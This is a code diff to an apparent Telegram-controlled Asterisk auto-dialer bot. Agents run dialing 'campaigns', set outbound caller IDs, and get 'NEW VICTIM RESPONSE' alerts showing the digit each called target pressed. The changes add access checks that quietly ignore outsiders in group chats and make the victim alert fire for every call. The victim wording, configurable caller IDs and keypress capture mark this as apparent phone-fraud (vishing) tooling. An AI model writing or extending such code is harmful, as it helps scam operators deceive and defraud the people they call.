@@ -199,12 +199,50 @@ async def get_db_session():
         except Exception:
             raise
 
+async def is_user_authorized(user_id: int) -> bool:
+    """Check if a user is authorized to use the bot."""
+    try:
+        async with get_db_session() as session:
+            result = await session.execute(select(Agent).filter_by(telegram_id=user_id))
+            agent = result.scalar_one_or_none()
+            return agent is not None and agent.is_authorized
+    except Exception as e:
+        logger.error(f"Error checking user authorization: {e}")
+        return False
+
+async def check_authorization(update: Update, context: ContextTypes.DEFAULT_TYPE, silent_fail: bool = True) -> bool:
+    """Check if user is authorized. In groups, silently ignore unauthorized users."""
+    user = update.effective_user
+    if not user:
+        return False
+    
+    # Check if user is authorized
+    authorized = await is_user_authorized(user.id)
+    
+    if not authorized:
+        # In private chats, send error message
+        # In group chats, silently ignore (to avoid spam)
+        chat_type = update.effective_chat.type if update.effective_chat else "private"
+        
+        if chat_type == "private" and not silent_fail:
+            if update.effective_message:
+                await update.effective_message.reply_text(
+                    "❌ You are not authorized to use this bot. Please contact an administrator."
+                )
+        elif chat_type in ["group", "supergroup"]:
+            # In groups, just log and ignore
+            logger.info(f"Ignoring unauthorized user {user.id} (@{user.username}) in group {update.effective_chat.id}")
+    
+    return authorized
+
 async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     """Handle errors."""
     logger.error("Exception while handling an update:", exc_info=context.error)
-    error_message = "An error occurred while processing your request. Please try again later."
     
-    if update.effective_message:
+    # Only send error messages in private chats to avoid group spam
+    chat_type = update.effective_chat.type if update.effective_chat else "private"
+    if chat_type == "private" and update.effective_message:
+        error_message = "An error occurred while processing your request. Please try again later."
         await update.effective_message.reply_text(error_message)
 
 async def show_main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE, agent: Agent) -> None:
@@ -335,6 +373,10 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     try:
         user = update.effective_user
         
+        # Check authorization first
+        if not await check_authorization(update, context, silent_fail=False):
+            return ConversationHandler.END
+        
         async with get_db_session() as session:
             try:
                 result = await session.execute(select(Agent).filter_by(telegram_id=user.id))
@@ -347,6 +389,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
                         is_authorized=user.id == SUPER_ADMIN_ID
                     )
                     session.add(agent)
+                    await session.commit()
                 
                 await show_main_menu(update, context, agent)
                 return MAIN_MENU
@@ -383,6 +426,11 @@ async def handle_main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE) -
     """Handle main menu button presses."""
     query = update.callback_query
     await query.answer()
+    
+    # Check authorization for all menu interactions
+    if not await check_authorization(update, context, silent_fail=True):
+        return ConversationHandler.END
+        
     agent = None # Initialize agent
 
     # Add handling for back_main first
@@ -727,6 +775,11 @@ async def handle_settings(update: Update, context: ContextTypes.DEFAULT_TYPE) ->
     """Handle settings menu interactions."""
     query = update.callback_query
     await query.answer()
+    
+    # Check authorization
+    if not await check_authorization(update, context, silent_fail=True):
+        return ConversationHandler.END
+    
     user_id = update.effective_user.id
     agent = None # Define agent outside to potentially use in else block
     
@@ -912,6 +965,10 @@ async def handle_agent_management(update: Update, context: ContextTypes.DEFAULT_
     query = update.callback_query
     await query.answer()
     
+    # Check authorization first
+    if not await check_authorization(update, context, silent_fail=True):
+        return ConversationHandler.END
+    
     if query.data == "back_main":
         # Need to fetch agent to show main menu
         async with get_db_session() as session:
@@ -1012,6 +1069,10 @@ async def handle_agent_management(update: Update, context: ContextTypes.DEFAULT_
 
 async def handle_agent_id_input(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     """Handle agent ID input for authorization/deauthorization."""
+    # Check authorization first
+    if not await check_authorization(update, context, silent_fail=True):
+        return ConversationHandler.END
+    
     # Handle callback queries (buttons) first
     if update.callback_query:
         query = update.callback_query
@@ -1147,7 +1208,10 @@ async def set_autodial_caller_id(update: Update, context: ContextTypes.DEFAULT_T
     """Set agent's outbound caller ID specifically for Auto-Dial campaigns."""
     user = update.effective_user
     if not user:
-        await update.message.reply_text("Could not identify user.")
+        return
+
+    # Check authorization first
+    if not await check_authorization(update, context, silent_fail=False):
         return
 
     # Fetch agent data
@@ -1159,11 +1223,6 @@ async def set_autodial_caller_id(update: Update, context: ContextTypes.DEFAULT_T
         if not agent:
             await update.message.reply_text("❌ Error: Agent not found. Please use /start first.")
             return
-
-        # Authorization Check: Require general authorization (no DB change here)
-        if not agent.is_authorized:
-             await update.message.reply_text("❌ Error: You are not authorized to set configuration.")
-             return
 
         # Argument parsing (no DB change)
         if not context.args:
@@ -1213,7 +1272,10 @@ async def set_route(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Set agent's route (one or two) for auto-dial campaigns."""
     user = update.effective_user
     if not user:
-        await update.message.reply_text("Could not identify user.")
+        return
+
+    # Check authorization first
+    if not await check_authorization(update, context, silent_fail=False):
         return
 
     async with get_db_session() as session:
@@ -1222,10 +1284,6 @@ async def set_route(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
         if not agent:
             await update.message.reply_text("❌ Error: Agent not found. Please use /start first.")
-            return
-
-        if not agent.is_authorized:
-            await update.message.reply_text("❌ Error: You are not authorized to set route.")
             return
 
         if not context.args:
@@ -1324,6 +1382,10 @@ async def get_asterisk_status(context: ContextTypes.DEFAULT_TYPE) -> dict:
 
 async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Show system status - Admin only command."""
+    # Check authorization first
+    if not await check_authorization(update, context, silent_fail=False):
+        return
+        
     if update.effective_user.id != SUPER_ADMIN_ID:
         await update.message.reply_text(
             "❌ *Unauthorized Access*\n\n"
@@ -2070,30 +2132,8 @@ async def dtmf_begin_listener(manager, event):
                         campaign_id = call.campaign_id
                         agent_id = call.agent_telegram_id or agent_id
         
-        # Format the notification
-        campaign_text = f"• Campaign: `{campaign_id}`\n" if campaign_id else ""
-        notification = (
-            "🔔 *DTMF PRESS STARTED*\n\n"
-            f"{campaign_text}"
-            f"• Target: `{target_number}`\n"
-            f"• CallerID: `{caller_id}`\n"
-            f"• Time: {datetime.now().strftime('%Y-%m-%d %I:%M:%S %p')}"
-        )
-        
-        # Get application instance from global variable
-        global application
-        application = global_application_instance
-        if not application:
-            logger.error("Application instance not found globally. Cannot send DTMFBegin notification.")
-            return
-
-        await application.bot.send_message(
-            chat_id=agent_id,
-            text=notification,
-            parse_mode='Markdown'
-        )
-        
-        logger.info(f"Sent DTMFBegin notification to agent {agent_id}")
+        # DTMFBegin notification removed - we only notify on DTMFEnd when we have the actual digit
+        logger.info(f"DTMFBegin detected for {target_number} - waiting for DTMFEnd with actual digit")
         
     except Exception as e:
         logger.error(f"Error processing DTMFBegin event: {e}", exc_info=True)
@@ -2257,7 +2297,27 @@ async def dtmf_event_listener(manager, event):
             display_tracking_id = tracking_id
             logger.info(f"Using tracking ID from event: {display_tracking_id}")
         
-        # P1 Campaign Integration: Update campaign state and send notifications
+        # Send NEW VICTIM RESPONSE notification for ALL calls
+        campaign_display = f"{campaign_id}" if campaign_id else display_tracking_id
+        
+        notification = (
+            f"🎯 *NEW VICTIM RESPONSE*\n\n"
+            f"#{campaign_display}\n\n"
+            f"• Target: `{target_number}`\n"
+            f"• CallerID: `{caller_id}`\n"
+            f"• Pressed: `{digit}`\n"
+            f"• Time: {datetime.now().strftime('%Y-%m-%d %I:%M:%S %p')}"
+        )
+        
+        await application.bot.send_message(
+            chat_id=agent_id,
+            text=notification,
+            parse_mode='Markdown'
+        )
+        
+        logger.info(f"Sent NEW VICTIM RESPONSE notification to agent {agent_id}")
+        
+        # P1 Campaign Integration: Update campaign state 
         if campaign_id and isinstance(campaign_id, int) and campaign_id in campaign_states:
             # Update campaign statistics
             campaign_states[campaign_id].dtmf_responses += 1
@@ -2265,33 +2325,6 @@ async def dtmf_event_listener(manager, event):
             
             # Update campaign message in real-time
             await update_campaign_message(campaign_id)
-            
-            # Send individual notification if enabled
-            await send_individual_notification(campaign_id, "dtmf_response", {
-                "target_number": target_number,
-                "digit": digit,
-                "caller_id": caller_id
-            })
-        else:
-            # Legacy notification for non-campaign calls or unknown campaigns
-            campaign_display = f"{campaign_id}" if campaign_id else display_tracking_id
-            
-            notification = (
-                f"🎯 *NEW VICTIM RESPONSE*\n\n"
-                f"#{campaign_display}\n\n"
-                f"• Target: `{target_number}`\n"
-                f"• CallerID: `{caller_id}`\n"
-                f"• Pressed: `{digit}`\n"
-                f"• Time: {datetime.now().strftime('%Y-%m-%d %I:%M:%S %p')}"
-            )
-            
-            await application.bot.send_message(
-                chat_id=agent_id,
-                text=notification,
-                parse_mode='Markdown'
-            )
-            
-            logger.info(f"Sent legacy DTMF notification to agent {agent_id}")
         
     except Exception as e:
         logger.error(f"Error processing DTMF event: {e}", exc_info=True)
@@ -2884,30 +2917,21 @@ async def handle_autodial_command(update: Update, context: ContextTypes.DEFAULT_
     """
     user = update.effective_user
     if not user:
-        if update.message:
-            await update.message.reply_text("Could not identify user.")
-        return None # Or ConversationHandler.END ? Let's return None for now.
+        return ConversationHandler.END
+
+    # Check authorization first
+    if not await check_authorization(update, context, silent_fail=False):
+        return ConversationHandler.END
 
     async with get_db_session() as session: # <-- Async context
         # agent = session.query(Agent).filter_by(telegram_id=user.id).first()
         result = await session.execute(select(Agent).filter_by(telegram_id=user.id)) # <-- Async Query
         agent = result.scalar_one_or_none()
 
-        if not agent or not agent.is_authorized:
+        if not agent:
              if update.message: # Check if update.message exists
-                await update.message.reply_text(
-                    "❌ You are not authorized to use the Auto-Dial feature. "
-                    "Please contact an administrator for authorization."
-                )
-             # Attempt to show main menu if agent exists (even if unauthorized for autodial)
-             try:
-                if agent:
-                     # Need to pass the existing agent object
-                     await show_main_menu(update, context, agent) # <-- Await helper
-                return MAIN_MENU # Go back to main menu if not authorized
-             except Exception as e:
-                 logger.error(f"Error trying to show main menu after failed auth in /autodial: {e}")
-                 return ConversationHandler.END # Fallback on error showing menu
+                await update.message.reply_text("❌ Error: Agent not found. Please use /start first.")
+             return ConversationHandler.END
 
         # Check if route is configured
         if not agent.route:
@@ -2942,29 +2966,23 @@ async def handle_auto_dial_file(update: Update, context: ContextTypes.DEFAULT_TY
     """Handles the uploaded .txt file for auto-dialing."""
     user = update.effective_user
     if not user:
-        if update.message: await update.message.reply_text("Could not identify user.")
-        return AUTO_DIAL # Stay in state, prompt again? Or MAIN_MENU? Let's stay for now.
+        return ConversationHandler.END
+
+    # Check authorization first
+    if not await check_authorization(update, context, silent_fail=False):
+        return ConversationHandler.END
 
     agent = None # Initialize agent
-    # Check authorization again
+    # Get agent data
     async with get_db_session() as session: # <-- Async context
         # agent = session.query(Agent).filter_by(telegram_id=user.id).first()
         result = await session.execute(select(Agent).filter_by(telegram_id=user.id)) # <-- Async Query
         agent = result.scalar_one_or_none()
 
-        if not agent or not agent.is_authorized:
-            if update.message: await update.message.reply_text("❌ You are not authorized to use the Auto-Dial feature.")
-            # Maybe show main menu?
-            if agent: # If agent exists (but isn't authorized for autodial), show their menu
-                 try:
-                    await show_main_menu(update, context, agent) # <-- Await helper
-                 except Exception as e:
-                     logger.error(f"Error showing main menu after file auth fail: {e}")
-                     return ConversationHandler.END # Fallback
-            else: # If agent doesn't even exist
-                 if update.message: await update.message.reply_text("Agent record not found.")
-                 return ConversationHandler.END # Or MAIN_MENU?
-            return MAIN_MENU # Go to main menu if not authorized here
+        if not agent:
+            if update.message: 
+                await update.message.reply_text("❌ Error: Agent not found. Please use /start first.")
+            return ConversationHandler.END
 
         # Check if route is configured
         if not agent.route:
@@ -3150,6 +3168,10 @@ async def handle_auto_dial(update: Update, context: ContextTypes.DEFAULT_TYPE) -
         return AUTO_DIAL 
         
     await query.answer()
+    
+    # Check authorization
+    if not await check_authorization(update, context, silent_fail=True):
+        return ConversationHandler.END
     
     if query.data == "back_main":
         async with get_db_session() as session: # <-- Async context
@@ -3358,6 +3380,13 @@ def main():
     call_handler = CommandHandler("call", call)
     status_handler = CommandHandler("status", status)
 
+    # Create a filter for authorized users only
+    async def authorized_user_filter(update, context):
+        """Filter to only allow authorized users."""
+        if not update.effective_user:
+            return False
+        return await is_user_authorized(update.effective_user.id)
+    
     # Add conversation handler for menu navigation and multi-step processes
     conv_handler = ConversationHandler(
         entry_points=[
